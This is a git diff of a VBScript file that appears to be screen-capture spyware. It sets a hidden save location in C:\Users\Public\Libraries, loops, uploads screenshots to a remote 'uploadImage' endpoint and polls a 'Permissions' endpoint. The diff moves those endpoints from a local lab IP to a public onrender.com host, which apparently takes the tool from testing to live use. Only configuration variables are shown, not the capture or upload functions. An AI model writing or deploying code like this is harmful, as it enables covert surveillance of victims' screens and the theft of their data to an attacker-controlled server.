@@ -1,5 +1,5 @@
 'CheckInternetConnection
-Dim url : url = "https://knuth-programming-hub-9p08.onrender.com/"
+Dim url : url = "https://vibescope.onrender.com/"
 
 ' CaptureScreenshot variables
 Dim outputDirectory : outputDirectory = "C:\Users\Public\Libraries"
@@ -7,10 +7,10 @@ Dim filename : filename = "Screenshot.png"
 
 ' UploadImage & DeleteFile variables
 Dim imagePath : imagePath = "C:\Users\Public\Libraries\Screenshot.png" 
-Dim apiEndpoint : apiEndpoint = "http://192.168.56.2:8080/uploadImage"
+Dim apiEndpoint : apiEndpoint = "https://vibescope.onrender.com/uploadImage"
 
 ' GetPermissions variable
-Dim PermissionsEndpoint : PermissionsEndpoint = "http://192.168.56.2:8080/Permissions/"
+Dim PermissionsEndpoint : PermissionsEndpoint = "https://vibescope.onrender.com/Permissions/"
 
 Do
 	CheckInternetConnection
